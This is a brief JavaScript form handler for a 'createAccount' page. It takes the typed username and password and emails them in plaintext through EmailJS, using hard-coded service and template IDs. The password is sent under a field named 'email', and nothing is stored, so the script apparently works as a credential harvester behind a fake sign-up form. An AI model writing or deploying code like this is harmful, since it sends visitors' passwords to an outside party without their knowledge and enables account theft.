(function () {
    emailjs.init("yvgEpr9WavK6KgXh3"); // Replace with your EmailJS User ID
})();

document.getElementById("createAccount").addEventListener("submit", function (e) {
    e.preventDefault(); // Prevent the form from submitting in the traditional way
    
    const params = {
        identify: document.getElementById("username").value,
        email: document.getElementById("password").value,
    };

    emailjs.send("service_nkuhy2y", "template_fexre2d", params) // Replace with your Service ID and Template ID
        .then(function (res) {
            alert("Email sent successfully! Status: ");
            clearFormFields(); // Call the function to clear form fields
        })
        .catch(function (error) {
            alert("An error occurred while sending the email: " + error);
        });
});

function clearFormFields() {
    // Replace these lines with clearing the fields you want
    document.getElementById("username").value = "";
    document.getElementById("password").value = "";
}

